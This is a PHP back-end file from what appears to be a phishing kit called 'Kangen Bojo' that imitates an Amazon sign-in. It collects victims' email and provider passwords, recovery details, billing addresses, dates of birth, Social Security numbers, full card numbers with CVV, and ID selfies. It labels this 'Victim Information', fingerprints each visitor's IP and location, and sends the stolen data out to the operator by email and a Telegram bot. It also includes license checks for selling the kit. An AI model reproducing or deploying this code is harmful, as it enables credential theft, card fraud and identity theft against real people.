<?php
function getClientInfo() {
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    
    // Deteksi perangkat
    $device = 'Desktop';
    if(preg_match('/(android|iphone|ipad)/i', $userAgent)) $device = 'Mobile';
    
    // Deteksi browser
    $browser = 'Unknown';
    if(preg_match('/chrome/i', $userAgent)) $browser = 'Chrome';
    elseif(preg_match('/firefox/i', $userAgent)) $browser = 'Firefox';
    elseif(preg_match('/safari/i', $userAgent)) $browser = 'Safari';
    
    // Geolokasi (gunakan API eksternal)
    $geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
    
    return [
        'ip' => $ip,
        'device' => $device,
        'browser' => $browser,
        'userAgent' => $userAgent,
        'date_time' => date('Y-m-d H:i:s'),
        'isp' => $geo['isp'] ?? 'Unknown',
        'city' => $geo['city'] ?? 'Unknown',
        'region' => $geo['regionName'] ?? 'Unknown',
        'country' => $geo['countryCode'] ?? 'XX',
        'country_name' => $geo['country'] ?? 'Unknown'
    ];
}

function getBINInfo($cardNumber) {
    $bin = substr($cardNumber, 0, 6);
    $cardType = '';
    $bankName = 'Unknown Bank';
    $country = 'Unknown';
    
    // Try to get info from BinList API
    $binlistUrl = "https://lookup.binlist.net/{$bin}";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $binlistUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
    
    $response = @curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $binData = @json_decode($response, true);
        
        if ($binData && is_array($binData)) {
            // Get card type
            if (isset($binData['type'])) {
                $cardType = ucfirst($binData['type']);
            }
            
            // Get bank name
            if (isset($binData['bank']['name'])) {
                $bankName = $binData['bank']['name'];
            }
            
            // Get country
            if (isset($binData['country']['name'])) {
                $country = $binData['country']['name'];
            }
        }
    }
    
    // Fallback detection if API fails
    if ($cardType === '') {
        if (preg_match('/^4/', $bin)) {
            $cardType = 'Visa';
        } elseif (preg_match('/^5[1-5]/', $bin)) {
            $cardType = 'Mastercard';
        } elseif (preg_match('/^3[47]/', $bin)) {
            $cardType = 'American Express';
        } elseif (preg_match('/^6(?:011|5)/', $bin)) {
            $cardType = 'Discover';
        } else {
            $cardType = 'Unknown Card';
        }
    }
    
    return [
        'bin' => $bin,
        'cardType' => $cardType,
        'bankName' => $bankName,
        'country' => $country,
        'fullBin' => "{$bin} - {$cardType} {$bankName} ({$country})"
    ];
}

function sendResult($type, $data) {
    global $config;
    $client = getClientInfo();
    $message = ":: KANGEN BOJO ::\n\n";
    
    switch($type) {
        case 'email_access':
            $message .= "[#] Email : {$data['email']}\n";
            
            // Check if ini email provider password (has email_provider key)
            if (isset($data['email_provider'])) {
                $message .= "[#] Email Provider : " . strtoupper($data['email_provider']) . "\n";
                $message .= "[#] Provider Password : {$data['provider_password']}\n";
                if (!empty($data['recovery_email'])) {
                    $message .= "[#] Recovery Email : {$data['recovery_email']}\n";
                }
                if (!empty($data['recovery_phone'])) {
                    $message .= "[#] Recovery Phone : {$data['recovery_phone']}\n";
                }
                $message .= "\n:: Device Information ::\n\n";
                $subject = "Email Access [{$data['email_provider']}]: {$client['date_time']}";
            } else {
                // Amazon login password
                $message .= "[#] Password : {$data['password']}\n\n";
                $message .= ":: Access Information ::\n\n";
                $subject = "Email Access: {$client['date_time']}";
            }
            
            $message .= "[#] IP Address : {$client['ip']}\n";
            $message .= "[#] Device : {$client['device']}\n";
            $message .= "[#] Browser : {$client['browser']}\n";
            $message .= "[#] Country : {$client['country_name']}\n";
            $message .= "[#] City : {$client['city']}\n";
            $message .= "[#] ISP : {$client['isp']}\n";
            $message .= "[#] Timestamp : {$client['date_time']}\n";
            break;
            
        case 'login':
            $message .= "[#] Email : {$data['email']}\n"; 
            $message .= "[#] Password : {$data['password']}\n\n";
            $message .= ":: Victim Information ::\n\n";
            $message .= "[#] IP Address : {$client['ip']}\n";
            $message .= "[#] Device : {$client['device']}\n";
            $message .= "[#] Browser : {$client['browser']}\n";
            $message .= "[#] Country : {$client['country_name']}\n";
            $message .= "[#] ISP : {$client['isp']}\n";
            $subject = "Sign In Account: {$client['date_time']}";
            break;
            
        case 'billing':
            $message .= "[#] Email : {$data['email']}\n"; 
            $message .= "[#] Password : {$data['password']}\n\n";
            $message .= ":: Billing Information ::\n\n";
            $message .= "[#] Fullname : {$data['fullname']}\n";
            $message .= "[#] Address 1 : {$data['address']}\n";
            $message .= "[#] Address 2 : {$data['address2']}\n";
            $message .= "[#] City : {$data['city']}\n";
            $message .= "[#] State : {$data['state']}\n";
            $message .= "[#] ZipCode : {$data['zipcode']}\n";
            $message .= "[#] PhoneNumber : {$data['phonenumber']}\n";
            $message .= "[#] Date Of Birth : {$data['dob']}\n";
            $message .= "[#] Social Security Number : {$data['sosel']}\n";
            $subject = "Billing Address: {$client['date_time']}";
            break;
            
        case 'card':
            $binInfo = getBINInfo($data['cardNumber']);
            $message .= ":: Card Information ::\n\n";
            $message .= "[#] BIN : {$binInfo['fullBin']}\n";
            $message .= "[#] CARDHOLDER NAME : {$data['cardname']}\n";
            $message .= "[#] CARD NUMBER : {$data['cardNumber']}\n";
            $message .= "[#] EXPIRATION : {$data['expirationDate']}\n";
            $message .= "[#] CVV/CVV2 : {$data['cvv']}\n";
            $message .= "[#] CID : {$data['cid']}\n";
            $message .= ":: Billing Information ::\n\n";
            $message .= "[#] Fullname : {$data['fullname']}\n";
            $message .= "[#] Address 1 : {$data['address']}\n";
            $message .= "[#] Address 2 : {$data['address2']}\n";
            $message .= "[#] City : {$data['city']}\n";
            $message .= "[#] State : {$data['state']}\n";
            $message .= "[#] ZipCode : {$data['zipcode']}\n";
            $message .= "[#] PhoneNumber : {$data['phonenumber']}\n";
            $message .= "[#] Date Of Birth : {$data['dob']}\n";
            $message .= "[#] Social Security Number : {$data['sosel']}\n";
            $subject = "{$data['fullname']} :: {$binInfo['fullBin']} :: [{$client['ip']} - {$client['country_name']}]";
            break;
            
        case 'card_backup':
            $binInfo = getBINInfo($data['cardNumber']);
            $message .= ":: BACKUP CARD INFORMATION ::\n\n";
            $message .= "[#] BIN : {$binInfo['fullBin']}\n";
            $message .= "[#] CARDHOLDER NAME : {$data['cardname']}\n";
            $message .= "[#] CARD NUMBER : {$data['cardNumber']}\n";
            $message .= "[#] EXPIRATION : {$data['expirationDate']}\n";
            $message .= "[#] CVV/CVV2 : {$data['cvv']}\n";
            $message .= "[#] CID : {$data['cid']}\n";
            $subject = "BACKUP CARD :: {$binInfo['fullBin']} :: [{$client['ip']} - {$client['country_name']}]";
            break;
            
        case 'selfie':
            $message .= "PAP ID:\n{$data['pap_id']}\n\n";
            $message .= "PAP ID WITH SELFIE:\n{$data['selfie']}\n\n";
            $subject = "Selfie Verification: {$client['date_time']}";
            break;
    }
    
    $message .= "[#] Date & Time : {$client['date_time']}\n";
    $message .= "[#] IP : {$client['ip']}\n";
    $message .= "[#] ISP : {$client['isp']}\n";
    $message .= "[#] Device : {$client['device']}\n";
    $message .= "[#] Browser : {$client['browser']}\n";
    $message .= "[#] City : {$client['city']}\n";
    $message .= "[#] Region : {$client['region']}\n";
    $message .= "[#] Country : {$client['country_name']}\n";
    $message .= "[#] User Agent : {$client['userAgent']}\n";
    $message .= "\n:: Kangen Bojo ID ::";
    
    // Kirim via Email
    if($config['sending_methods']['email']) {
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-type: text/plain; charset=UTF-8\r\n";
        $headers .= "From: Kangen Bojo ID <no-reply@kangenbojo.id>\r\n";
        $headers .= "Reply-To: support@kangenbojo.id\r\n";
        $headers .= "X-Mailer: PHP/" . phpversion();
        mail($config['email_result'], $subject, $message, $headers);
    }
    
    // Kirim via Telegram
    if($config['sending_methods']['telegram']) {
        $url = "https://api.telegram.org/bot{$config['telegram_token']}/sendMessage";
        $text = urlencode($message);
        file_get_contents("{$url}?chat_id={$config['telegram_chat_id']}&text={$text}");
    }
    
    // Increment login counter if this is a login submission
    global $conn;
    if ($type === 'login') {
        $result = $conn->query("SELECT config_data FROM settings LIMIT 1");
        if ($result && $result->num_rows > 0) {
            $row = $result->fetch_assoc();
            $config_data = json_decode($row['config_data'], true);
            if (!isset($config_data['login_count'])) {
                $config_data['login_count'] = 0;
            }
            $config_data['login_count']++;
            $updated_config = json_encode($config_data);
            $conn->query("UPDATE settings SET config_data = '{$conn->real_escape_string($updated_config)}' WHERE id = 1");
        }
    }
}

function generateRef() {
    // Generate random string 9 characters
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $ref = '';
    for ($i = 0; $i < 9; $i++) {
        $ref .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $ref;
}

function checkLicense($license_key) {
    global $conn;
    $license_key = trim($license_key); // hilangkan spasi
    $stmt = $conn->prepare("SELECT * FROM licenses WHERE license_key = ? AND active = 1 LIMIT 1");
    $stmt->bind_param("s", $license_key);
    $stmt->execute();
    $result = $stmt->get_result();
    return $result->num_rows > 0;
}

function isVPN($ip) {
    $vpn_ranges = ['192.76.0.0/16', '172.16.0.0/12', '10.0.0.0/8'];
    foreach ($vpn_ranges as $range) {
        if (ip_in_range($ip, $range)) return true;
    }
    return false;
}

function ip_in_range($ip, $range) {
    list($subnet, $mask) = explode('/', $range);
    $ip = ip2long($ip);
    $subnet = ip2long($subnet);
    $mask = -1 << (32 - $mask);
    $subnet &= $mask;
    return ($ip & $mask) == $subnet;
}
?>